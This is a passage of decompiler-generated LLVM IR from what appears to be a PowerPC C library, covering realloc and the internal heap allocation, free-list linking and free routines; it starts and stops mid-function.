  %v1_10005c74 = add i32 %v0_10005c68, 8
  %v2_10005c74 = inttoptr i32 %v1_10005c74 to i32*
  %v3_10005c74 = load i32, i32* %v2_10005c74, align 4
  %v2_10005c78 = add i32 %v3_10005c68, 8
  %v3_10005c78 = inttoptr i32 %v2_10005c78 to i32*
  store i32 %v3_10005c74, i32* %v3_10005c78, align 4
  %v0_10005c7c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10005c7c

dec_label_pc_10005c7c:                            ; preds = %dec_label_pc_10005c68, %dec_label_pc_10005c74
  %v0_10005c7c = phi i32 [ %v0_10005c68, %dec_label_pc_10005c68 ], [ %v0_10005c7c.pre, %dec_label_pc_10005c74 ]
  %v1_10005c7c = add i32 %v0_10005c7c, 8
  %v2_10005c7c = inttoptr i32 %v1_10005c7c to i32*
  %v3_10005c7c = load i32, i32* %v2_10005c7c, align 4
  %v1_10005c80 = add i32 %v0_10005c7c, 4
  %v2_10005c80 = inttoptr i32 %v1_10005c80 to i32*
  %v3_10005c80 = load i32, i32* %v2_10005c80, align 4
  %v3_10005c84 = icmp eq i32 %v3_10005c7c, 0
  br i1 %v3_10005c84, label %dec_label_pc_10005c94, label %dec_label_pc_10005c8c

dec_label_pc_10005c8c:                            ; preds = %dec_label_pc_10005c7c
  %v2_10005c8c = add i32 %v3_10005c7c, 4
  %v3_10005c8c = inttoptr i32 %v2_10005c8c to i32*
  store i32 %v3_10005c80, i32* %v3_10005c8c, align 4
  br label %dec_label_pc_10005c98

dec_label_pc_10005c94:                            ; preds = %dec_label_pc_10005c7c
  store i32 %v3_10005c80, i32* @global_var_1001d7fc, align 4
  br label %dec_label_pc_10005c98

dec_label_pc_10005c98:                            ; preds = %dec_label_pc_10005c8c, %dec_label_pc_10005c94
  %v0_10005ca0 = call i32 @__pthread_return_0()
  %v0_10005ca4 = load i32, i32* @r27, align 4
  %v1_10005ca4 = load i32, i32* @r29, align 4
  %v0_10005cac = load i32, i32* @r31, align 4
  %v2_10005ca4 = sub i32 12, %v0_10005ca4
  %v1_10005ca8 = add i32 %v2_10005ca4, %v1_10005ca4
  %v2_10005cac = sub i32 %v1_10005ca8, %v0_10005cac
  store i32 268459188, i32* @lr, align 4
  %v1_10005cb0 = call i32 @__GI_sbrk(i32 %v2_10005cac)
  br label %dec_label_pc_10005cbc

dec_label_pc_10005cbc:                            ; preds = %dec_label_pc_10005c60, %dec_label_pc_10005c98
  %v0_10005cbc = call i32 @__pthread_return_0()
  br label %dec_label_pc_10005cc0

dec_label_pc_10005cc0:                            ; preds = %entry, %dec_label_pc_10005cbc
  %.0 = phi i32 [ undef, %entry ], [ %v0_10005cbc, %dec_label_pc_10005cbc ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_10005c7c, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10005cc0, { 1, 0 }
  uselistorder label %dec_label_pc_10005cbc, { 1, 0 }
  uselistorder label %dec_label_pc_10005c98, { 1, 0 }
  uselistorder label %dec_label_pc_10005c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10005c60, { 1, 0 }
}

define i32 @realloc(i32 %arg1) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10005cd4 = load i32, i32* @r4, align 4
  %v3_10005cd4 = icmp eq i32 %v0_10005cd4, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_10005cd4, label %dec_label_pc_10005cf0, label %dec_label_pc_10005cfc

dec_label_pc_10005cf0:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10005cf4.396 to i32), i32* @lr, align 4
  %v0_10005cf0 = call i32 @free()
  br label %dec_label_pc_10005d08

dec_label_pc_10005cfc:                            ; preds = %entry
  %v3_10005cfc = icmp eq i32 %arg1, 0
  br i1 %v3_10005cfc, label %dec_label_pc_10005d08, label %dec_label_pc_10005d14

dec_label_pc_10005d08:                            ; preds = %dec_label_pc_10005cfc, %dec_label_pc_10005cf0
  %storemerge = phi i32 [ 0, %dec_label_pc_10005cf0 ], [ %v0_10005cd4, %dec_label_pc_10005cfc ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268459276, i32* @lr, align 4
  %v0_10005d08 = call i32 @malloc()
  store i32 %v0_10005d08, i32* @r28, align 4
  br label %dec_label_pc_10005dec

dec_label_pc_10005d14:                            ; preds = %dec_label_pc_10005cfc
  %v1_10005d14 = add i32 %v0_10005cd4, 7
  %v1_10005d18 = add i32 %arg1, -4
  store i32 %v1_10005d18, i32* %r27.global-to-local, align 4
  %v1_10005d1c = call i32 @__asm_rlwinm(i32 %v1_10005d14, i32 0, i32 0, i32 29)
  store i32 %v1_10005d1c, i32* %r31.global-to-local, align 4
  %v2_10005d20 = inttoptr i32 %v1_10005d18 to i32*
  %v3_10005d20 = load i32, i32* %v2_10005d20, align 4
  store i32 %v3_10005d20, i32* @r30, align 4
  %v2_10005d24 = icmp ugt i32 %v1_10005d1c, 11
  br i1 %v2_10005d24, label %dec_label_pc_10005d30, label %dec_label_pc_10005d2c

dec_label_pc_10005d2c:                            ; preds = %dec_label_pc_10005d14
  store i32 12, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005d30

dec_label_pc_10005d30:                            ; preds = %dec_label_pc_10005d14, %dec_label_pc_10005d2c
  %v0_10005db0 = phi i32 [ %v1_10005d1c, %dec_label_pc_10005d14 ], [ 12, %dec_label_pc_10005d2c ]
  %v3_10005d30 = icmp ugt i32 %v0_10005db0, %v3_10005d20
  br i1 %v3_10005d30, label %dec_label_pc_10005d38, label %dec_label_pc_10005db0

dec_label_pc_10005d38:                            ; preds = %dec_label_pc_10005d30
  store i32 ptrtoint (i32* @global_var_1001fe9c.390 to i32), i32* @r29, align 4
  %v0_10005d44 = call i32 @__pthread_return_0()
  %v0_10005d4c = load i32, i32* %r27.global-to-local, align 4
  %v1_10005d4c = load i32, i32* @r30, align 4
  %v2_10005d4c = add i32 %v1_10005d4c, %v0_10005d4c
  %v1_10005d50 = load i32, i32* %r31.global-to-local, align 4
  %v2_10005d50 = sub i32 %v1_10005d50, %v1_10005d4c
  %v4_10005d58 = call i32 @__heap_alloc_at(i32* nonnull @global_var_1001d7fc, i32 %v2_10005d4c, i32 %v2_10005d50)
  store i32 %v4_10005d58, i32* %r27.global-to-local, align 4
  %v0_10005d64 = call i32 @__pthread_return_0()
  %v3_10005d68 = icmp eq i32 %v4_10005d58, 0
  br i1 %v3_10005d68, label %dec_label_pc_10005d7c, label %dec_label_pc_10005d70

dec_label_pc_10005d70:                            ; preds = %dec_label_pc_10005d38
  %v0_10005d70 = load i32, i32* @r30, align 4
  %v2_10005d70 = add i32 %v0_10005d70, %v4_10005d58
  %v1_10005d74 = load i32, i32* @r28, align 4
  %v2_10005d74 = add i32 %v1_10005d74, -4
  %v3_10005d74 = inttoptr i32 %v2_10005d74 to i32*
  store i32 %v2_10005d70, i32* %v3_10005d74, align 4
  br label %dec_label_pc_10005dec

dec_label_pc_10005d7c:                            ; preds = %dec_label_pc_10005d38
  %v0_10005d7c = load i32, i32* %r31.global-to-local, align 4
  %v1_10005d7c = add i32 %v0_10005d7c, -4
  store i32 %v1_10005d7c, i32* @r3, align 4
  store i32 268459396, i32* @lr, align 4
  %v0_10005d80 = call i32 @malloc()
  store i32 %v0_10005d80, i32* @r3, align 4
  store i32 %v0_10005d80, i32* @r31, align 4
  %v3_10005d84 = icmp eq i32 %v0_10005d80, 0
  br i1 %v3_10005d84, label %dec_label_pc_10005d8c, label %dec_label_pc_10005d94

dec_label_pc_10005d8c:                            ; preds = %dec_label_pc_10005d7c
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10005dec

dec_label_pc_10005d94:                            ; preds = %dec_label_pc_10005d7c
  %v0_10005d94 = load i32, i32* @r28, align 4
  store i32 %v0_10005d94, i32* @r4, align 4
  %v0_10005d98 = load i32, i32* @r30, align 4
  %v1_10005d98 = add i32 %v0_10005d98, -4
  store i32 %v1_10005d98, i32* @r5, align 4
  store i32 268459424, i32* @lr, align 4
  %v0_10005d9c = call i32 @memcpy()
  %v0_10005da0 = load i32, i32* @r28, align 4
  store i32 %v0_10005da0, i32* @r3, align 4
  store i32 268459432, i32* @lr, align 4
  %v0_10005da4 = call i32 @free()
  %v0_10005da8 = load i32, i32* @r31, align 4
  store i32 %v0_10005da8, i32* @r28, align 4
  br label %dec_label_pc_10005dec

dec_label_pc_10005db0:                            ; preds = %dec_label_pc_10005d30
  %v1_10005db0 = add i32 %v0_10005db0, 28
  %v3_10005db4 = icmp ugt i32 %v1_10005db0, %v3_10005d20
  br i1 %v3_10005db4, label %dec_label_pc_10005dec, label %dec_label_pc_10005dbc

dec_label_pc_10005dbc:                            ; preds = %dec_label_pc_10005db0
  store i32 ptrtoint (i32* @global_var_1001fe9c.390 to i32), i32* @r29, align 4
  %v0_10005dc8 = call i32 @__pthread_return_0()
  %v0_10005dd0 = load i32, i32* %r27.global-to-local, align 4
  %v1_10005dd0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10005dd0 = add i32 %v1_10005dd0, %v0_10005dd0
  %v1_10005dd4 = load i32, i32* @r30, align 4
  %v2_10005dd4 = sub i32 %v1_10005dd4, %v1_10005dd0
  store i32 268459488, i32* @lr, align 4
  %v4_10005ddc = call i32 @__heap_free(i32* nonnull @global_var_1001d7fc, i32 %v2_10005dd0, i32 %v2_10005dd4)
  %v0_10005de4 = call i32 @__pthread_return_0()
  %v0_10005de8 = load i32, i32* @r31, align 4
  %v1_10005de8 = load i32, i32* @r28, align 4
  %v2_10005de8 = add i32 %v1_10005de8, -4
  %v3_10005de8 = inttoptr i32 %v2_10005de8 to i32*
  store i32 %v0_10005de8, i32* %v3_10005de8, align 4
  br label %dec_label_pc_10005dec

dec_label_pc_10005dec:                            ; preds = %dec_label_pc_10005db0, %dec_label_pc_10005d94, %dec_label_pc_10005d8c, %dec_label_pc_10005d70, %dec_label_pc_10005d08, %dec_label_pc_10005dbc
  %v0_10005df0 = load i32, i32* @r28, align 4
  ret i32 %v0_10005df0

; uselistorder directives
  uselistorder i32 %v1_10005dd0, { 1, 0 }
  uselistorder i32 %v4_10005d58, { 1, 0, 2 }
  uselistorder i32 %v1_10005d4c, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 0, 2, 1 }
  uselistorder i32* @global_var_1001d7fc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10005dec, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10005d30, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10005e04 = inttoptr i32 %arg2 to i32*
  %v2_10005e04 = load i32, i32* %v1_10005e04, align 4
  %v1_10005e08 = add i32 %v2_10005e04, 3
  store i32 %v1_10005e08, i32* %r9.global-to-local, align 4
  %v1_10005e0c = call i32 @__asm_rlwinm(i32 %v1_10005e08, i32 0, i32 0, i32 29)
  %v2_10005e10 = icmp ugt i32 %v1_10005e0c, 11
  br i1 %v2_10005e10, label %dec_label_pc_10005e94.preheader, label %dec_label_pc_10005e18

dec_label_pc_10005e18:                            ; preds = %entry
  br label %dec_label_pc_10005e94.preheader

dec_label_pc_10005e94.preheader:                  ; preds = %entry, %dec_label_pc_10005e18
  %storemerge20 = phi i32 [ 12, %dec_label_pc_10005e18 ], [ %v1_10005e0c, %entry ]
  %v0_10005e78 = phi i32 [ 12, %dec_label_pc_10005e18 ], [ %v1_10005e0c, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_10005e945 = icmp eq i32 %storemerge2, 0
  br i1 %v3_10005e945, label %dec_label_pc_10005e9c, label %dec_label_pc_10005e24

dec_label_pc_10005e24:                            ; preds = %dec_label_pc_10005e94.preheader, %dec_label_pc_10005e90
  %v0_10005e90 = phi i32 [ %storemerge, %dec_label_pc_10005e90 ], [ %storemerge2, %dec_label_pc_10005e94.preheader ]
  %v1_10005e24 = inttoptr i32 %v0_10005e90 to i32*
  %v2_10005e24 = load i32, i32* %v1_10005e24, align 4
  store i32 %v2_10005e24, i32* %r10.global-to-local, align 4
  %v2_10005e28 = icmp ult i32 %v2_10005e24, %v0_10005e78
  br i1 %v2_10005e28, label %dec_label_pc_10005e90, label %dec_label_pc_10005e30

dec_label_pc_10005e30:                            ; preds = %dec_label_pc_10005e24
  %v1_10005e30 = add i32 %v0_10005e78, 44
  %v2_10005e34 = icmp ult i32 %v2_10005e24, %v1_10005e30
  br i1 %v2_10005e34, label %dec_label_pc_10005e3c, label %dec_label_pc_10005e78

dec_label_pc_10005e3c:                            ; preds = %dec_label_pc_10005e30
  %v1_10005e3c = add i32 %v0_10005e90, 4
  %v2_10005e3c = inttoptr i32 %v1_10005e3c to i32*
  %v3_10005e3c = load i32, i32* %v2_10005e3c, align 4
  store i32 %v3_10005e3c, i32* %r11.global-to-local, align 4
  %v3_10005e40 = icmp eq i32 %v3_10005e3c, 0
  br i1 %v3_10005e40, label %dec_label_pc_10005e50, label %dec_label_pc_10005e48

dec_label_pc_10005e48:                            ; preds = %dec_label_pc_10005e3c
  %v1_10005e48 = add i32 %v0_10005e90, 8
  %v2_10005e48 = inttoptr i32 %v1_10005e48 to i32*
  %v3_10005e48 = load i32, i32* %v2_10005e48, align 4
  %v2_10005e4c = add i32 %v3_10005e3c, 8
  %v3_10005e4c = inttoptr i32 %v2_10005e4c to i32*
  store i32 %v3_10005e48, i32* %v3_10005e4c, align 4
  %v0_10005e50.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10005e6c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10005e50

dec_label_pc_10005e50:                            ; preds = %dec_label_pc_10005e3c, %dec_label_pc_10005e48
  %v0_10005e6c = phi i32 [ %v2_10005e24, %dec_label_pc_10005e3c ], [ %v0_10005e6c.pre, %dec_label_pc_10005e48 ]
  %v0_10005e50 = phi i32 [ %v0_10005e90, %dec_label_pc_10005e3c ], [ %v0_10005e50.pre, %dec_label_pc_10005e48 ]
  %v1_10005e50 = add i32 %v0_10005e50, 8
  %v2_10005e50 = inttoptr i32 %v1_10005e50 to i32*
  %v3_10005e50 = load i32, i32* %v2_10005e50, align 4
  %v1_10005e54 = add i32 %v0_10005e50, 4
  %v2_10005e54 = inttoptr i32 %v1_10005e54 to i32*
  %v3_10005e54 = load i32, i32* %v2_10005e54, align 4
  %v3_10005e58 = icmp eq i32 %v3_10005e50, 0
  store i32 %v0_10005e6c, i32* %r11.global-to-local, align 4
  br i1 %v3_10005e58, label %dec_label_pc_10005e6c, label %dec_label_pc_10005e60

dec_label_pc_10005e60:                            ; preds = %dec_label_pc_10005e50
  %v2_10005e64 = add i32 %v3_10005e50, 4
  %v3_10005e64 = inttoptr i32 %v2_10005e64 to i32*
  store i32 %v3_10005e54, i32* %v3_10005e64, align 4
  br label %dec_label_pc_10005e80

dec_label_pc_10005e6c:                            ; preds = %dec_label_pc_10005e50
  store i32 %v3_10005e54, i32* %arg1, align 4
  br label %dec_label_pc_10005e80

dec_label_pc_10005e78:                            ; preds = %dec_label_pc_10005e30
  %v2_10005e78 = sub i32 %v2_10005e24, %v0_10005e78
  store i32 %v2_10005e78, i32* %v1_10005e24, align 4
  br label %dec_label_pc_10005e80

dec_label_pc_10005e80:                            ; preds = %dec_label_pc_10005e6c, %dec_label_pc_10005e60, %dec_label_pc_10005e78
  %v0_10005e80 = load i32, i32* %r10.global-to-local, align 4
  %v1_10005e80 = load i32, i32* %r9.global-to-local, align 4
  %v2_10005e80 = sub i32 %v1_10005e80, %v0_10005e80
  store i32 %v2_10005e80, i32* %r9.global-to-local, align 4
  %v0_10005e84 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10005e84, i32* %v1_10005e04, align 4
  %v0_10005e88 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005e88 = add i32 %v0_10005e88, 12
  ret i32 %v1_10005e88

dec_label_pc_10005e90:                            ; preds = %dec_label_pc_10005e24
  %v1_10005e90 = add i32 %v0_10005e90, 4
  %storemerge.in = inttoptr i32 %v1_10005e90 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_10005e94 = icmp eq i32 %storemerge, 0
  br i1 %v3_10005e94, label %dec_label_pc_10005e94.dec_label_pc_10005e9c_crit_edge, label %dec_label_pc_10005e24

dec_label_pc_10005e94.dec_label_pc_10005e9c_crit_edge: ; preds = %dec_label_pc_10005e90
  br label %dec_label_pc_10005e9c

dec_label_pc_10005e9c:                            ; preds = %dec_label_pc_10005e94.dec_label_pc_10005e9c_crit_edge, %dec_label_pc_10005e94.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10005e50, { 1, 0 }
  uselistorder i32 %v2_10005e24, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_10005e90, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_10005e78, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 3, 4, 5, 1, 2, 0, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10005e80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005e50, { 1, 0 }
  uselistorder label %dec_label_pc_10005e24, { 1, 0 }
  uselistorder label %dec_label_pc_10005e94.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10005ea4 = load i32, i32* %arg1, align 4
  store i32 %v2_10005ea4, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v1_10005eac = add i32 %arg3, 3
  %v3_10005f303 = icmp eq i32 %v2_10005ea4, 0
  br i1 %v3_10005f303, label %dec_label_pc_10005f38, label %dec_label_pc_10005eb4

dec_label_pc_10005eb4:                            ; preds = %entry, %dec_label_pc_10005f2c
  %v0_10005f2c = phi i32 [ %v3_10005f2c, %dec_label_pc_10005f2c ], [ %v2_10005ea4, %entry ]
  %v1_10005eb4 = inttoptr i32 %v0_10005f2c to i32*
  %v2_10005eb4 = load i32, i32* %v1_10005eb4, align 4
  %v2_10005eb8 = sub i32 %v0_10005f2c, %v2_10005eb4
  %v1_10005ebc = add i32 %v2_10005eb8, 12
  %v3_10005ec0 = icmp ugt i32 %v1_10005ebc, %arg2
  br i1 %v3_10005ec0, label %dec_label_pc_10005f2c, label %dec_label_pc_10005ec8

dec_label_pc_10005ec8:                            ; preds = %dec_label_pc_10005eb4
  %v4_10005ec0 = icmp eq i32 %v1_10005ebc, %arg2
  br i1 %v4_10005ec0, label %dec_label_pc_10005ed0, label %dec_label_pc_10005f38

dec_label_pc_10005ed0:                            ; preds = %dec_label_pc_10005ec8
  %v1_10005ed0 = call i32 @__asm_rlwinm(i32 %v1_10005eac, i32 0, i32 0, i32 29)
  %v2_10005ed4 = icmp ult i32 %v2_10005eb4, %v1_10005ed0
  br i1 %v2_10005ed4, label %dec_label_pc_10005f38, label %dec_label_pc_10005edc

dec_label_pc_10005edc:                            ; preds = %dec_label_pc_10005ed0
  %v1_10005edc = add i32 %v1_10005ed0, 44
  %v2_10005ee0 = icmp ult i32 %v2_10005eb4, %v1_10005edc
  br i1 %v2_10005ee0, label %dec_label_pc_10005ee8, label %dec_label_pc_10005f1c

dec_label_pc_10005ee8:                            ; preds = %dec_label_pc_10005edc
  %v0_10005ee8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10005ee8 = add i32 %v0_10005ee8, 4
  %v2_10005ee8 = inttoptr i32 %v1_10005ee8 to i32*
  %v3_10005ee8 = load i32, i32* %v2_10005ee8, align 4
  %v3_10005eec = icmp eq i32 %v3_10005ee8, 0
  br i1 %v3_10005eec, label %dec_label_pc_10005efc, label %dec_label_pc_10005ef4

dec_label_pc_10005ef4:                            ; preds = %dec_label_pc_10005ee8
  %v1_10005ef4 = add i32 %v0_10005ee8, 8
  %v2_10005ef4 = inttoptr i32 %v1_10005ef4 to i32*
  %v3_10005ef4 = load i32, i32* %v2_10005ef4, align 4
  %v2_10005ef8 = add i32 %v3_10005ee8, 8
  %v3_10005ef8 = inttoptr i32 %v2_10005ef8 to i32*
  store i32 %v3_10005ef4, i32* %v3_10005ef8, align 4
  %v0_10005efc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10005efc

dec_label_pc_10005efc:                            ; preds = %dec_label_pc_10005ee8, %dec_label_pc_10005ef4
  %v0_10005efc = phi i32 [ %v0_10005ee8, %dec_label_pc_10005ee8 ], [ %v0_10005efc.pre, %dec_label_pc_10005ef4 ]
  %v1_10005efc = add i32 %v0_10005efc, 8
  %v2_10005efc = inttoptr i32 %v1_10005efc to i32*
  %v3_10005efc = load i32, i32* %v2_10005efc, align 4
  %v1_10005f00 = add i32 %v0_10005efc, 4
  %v2_10005f00 = inttoptr i32 %v1_10005f00 to i32*
  %v3_10005f00 = load i32, i32* %v2_10005f00, align 4
  %v3_10005f04 = icmp eq i32 %v3_10005efc, 0
  br i1 %v3_10005f04, label %dec_label_pc_10005f14, label %dec_label_pc_10005f0c

dec_label_pc_10005f0c:                            ; preds = %dec_label_pc_10005efc
  %v2_10005f0c = add i32 %v3_10005efc, 4
  %v3_10005f0c = inttoptr i32 %v2_10005f0c to i32*
  store i32 %v3_10005f00, i32* %v3_10005f0c, align 4
  ret i32 %v2_10005eb4

dec_label_pc_10005f14:                            ; preds = %dec_label_pc_10005efc
  %v1_10005f14 = load i32, i32* %r8.global-to-local, align 4
  %v2_10005f14 = inttoptr i32 %v1_10005f14 to i32*
  store i32 %v3_10005f00, i32* %v2_10005f14, align 4
  ret i32 %v2_10005eb4

dec_label_pc_10005f1c:                            ; preds = %dec_label_pc_10005edc
  %v2_10005f1c = sub i32 %v2_10005eb4, %v1_10005ed0
  %v1_10005f24 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005f24 = inttoptr i32 %v1_10005f24 to i32*
  store i32 %v2_10005f1c, i32* %v2_10005f24, align 4
  ret i32 %v1_10005ed0

dec_label_pc_10005f2c:                            ; preds = %dec_label_pc_10005eb4
  %v1_10005f2c = add i32 %v0_10005f2c, 4
  %v2_10005f2c = inttoptr i32 %v1_10005f2c to i32*
  %v3_10005f2c = load i32, i32* %v2_10005f2c, align 4
  store i32 %v3_10005f2c, i32* %r11.global-to-local, align 4
  %v3_10005f30 = icmp eq i32 %v3_10005f2c, 0
  br i1 %v3_10005f30, label %dec_label_pc_10005f30.dec_label_pc_10005f38.loopexit_crit_edge, label %dec_label_pc_10005eb4

dec_label_pc_10005f30.dec_label_pc_10005f38.loopexit_crit_edge: ; preds = %dec_label_pc_10005f2c
  br label %dec_label_pc_10005f38

dec_label_pc_10005f38:                            ; preds = %entry, %dec_label_pc_10005f30.dec_label_pc_10005f38.loopexit_crit_edge, %dec_label_pc_10005ec8, %dec_label_pc_10005ed0
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_10005f2c, { 1, 2, 0 }
  uselistorder i32 %v0_10005efc, { 1, 0 }
  uselistorder i32 %v1_10005ed0, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10005eb4, { 4, 3, 0, 2, 1, 5 }
  uselistorder i32 %v0_10005f2c, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10005f38, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10005efc, { 1, 0 }
  uselistorder label %dec_label_pc_10005eb4, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10005f40 = icmp eq i32 %arg3, 0
  %v2_10005f44 = add i32 %arg2, 4
  %v3_10005f44 = inttoptr i32 %v2_10005f44 to i32*
  store i32 %arg4, i32* %v3_10005f44, align 4
  %v2_10005f48 = add i32 %arg2, 8
  %v3_10005f48 = inttoptr i32 %v2_10005f48 to i32*
  store i32 %arg3, i32* %v3_10005f48, align 4
  br i1 %v3_10005f40, label %dec_label_pc_10005f58, label %dec_label_pc_10005f50

dec_label_pc_10005f50:                            ; preds = %entry
  %v2_10005f50 = add i32 %arg3, 4
  %v3_10005f50 = inttoptr i32 %v2_10005f50 to i32*
  store i32 %arg2, i32* %v3_10005f50, align 4
  br label %dec_label_pc_10005f5c

dec_label_pc_10005f58:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10005f5c

dec_label_pc_10005f5c:                            ; preds = %dec_label_pc_10005f50, %dec_label_pc_10005f58
  %v3_10005f5c = icmp eq i32 %arg4, 0
  %v0_10005f60 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10005f5c, i32 %v0_10005f60)
  %v2_10005f64 = add i32 %arg4, 8
  %v3_10005f64 = inttoptr i32 %v2_10005f64 to i32*
  store i32 %arg2, i32* %v3_10005f64, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 4, 3 }
  uselistorder label %dec_label_pc_10005f5c, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10005f6c = icmp eq i32 %arg3, 0
  br i1 %v3_10005f6c, label %dec_label_pc_10005f7c, label %dec_label_pc_10005f74

dec_label_pc_10005f74:                            ; preds = %entry
  %v2_10005f74 = add i32 %arg3, 4
  %v3_10005f74 = inttoptr i32 %v2_10005f74 to i32*
  store i32 %arg2, i32* %v3_10005f74, align 4
  br label %dec_label_pc_10005f80

dec_label_pc_10005f7c:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10005f80

dec_label_pc_10005f80:                            ; preds = %dec_label_pc_10005f74, %dec_label_pc_10005f7c
  %v2_10005f80 = add i32 %arg2, 8
  %v3_10005f80 = inttoptr i32 %v2_10005f80 to i32*
  store i32 %arg3, i32* %v3_10005f80, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005f80, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_10005fa0 = load i32, i32* %arg1, align 4
  store i32 %v2_10005fa0, i32* @r31, align 4
  %v2_10005fa4 = add i32 %arg3, %arg2
  store i32 %v2_10005fa4, i32* %r3.global-to-local, align 4
  %v3_10005fb87 = icmp eq i32 %v2_10005fa0, 0
  %v1_10005fbc8 = add i32 %v2_10005fa0, 12
  %tmp69 = icmp uge i32 %v1_10005fbc8, %arg2
  %or.cond10 = or i1 %v3_10005fb87, %tmp69
  br i1 %or.cond10, label %dec_label_pc_10005fc8, label %dec_label_pc_10005fb0

dec_label_pc_10005fb0:                            ; preds = %entry, %dec_label_pc_10005fb0
  %v0_1000601011 = phi i32 [ %v3_10005fb4, %dec_label_pc_10005fb0 ], [ %v2_10005fa0, %entry ]
  store i32 %v0_1000601011, i32* %r11.global-to-local, align 4
  %v1_10005fb4 = add i32 %v0_1000601011, 4
  %v2_10005fb4 = inttoptr i32 %v1_10005fb4 to i32*
  %v3_10005fb4 = load i32, i32* %v2_10005fb4, align 4
  store i32 %v3_10005fb4, i32* @r31, align 4
  %v3_10005fb8 = icmp eq i32 %v3_10005fb4, 0
  %v1_10005fbc = add i32 %v3_10005fb4, 12
  %tmp6 = icmp uge i32 %v1_10005fbc, %arg2
  %or.cond = or i1 %v3_10005fb8, %tmp6
  br i1 %or.cond, label %dec_label_pc_10005fc8, label %dec_label_pc_10005fb0

dec_label_pc_10005fc8:                            ; preds = %dec_label_pc_10005fb0, %entry
  %v0_10006004.lcssa = phi i32 [ 0, %entry ], [ %v0_1000601011, %dec_label_pc_10005fb0 ]
  %v0_10006010.lcssa = phi i32 [ %v2_10005fa0, %entry ], [ %v3_10005fb4, %dec_label_pc_10005fb0 ]
  %v3_10005fb8.lcssa = phi i1 [ %v3_10005fb87, %entry ], [ %v3_10005fb8, %dec_label_pc_10005fb0 ]
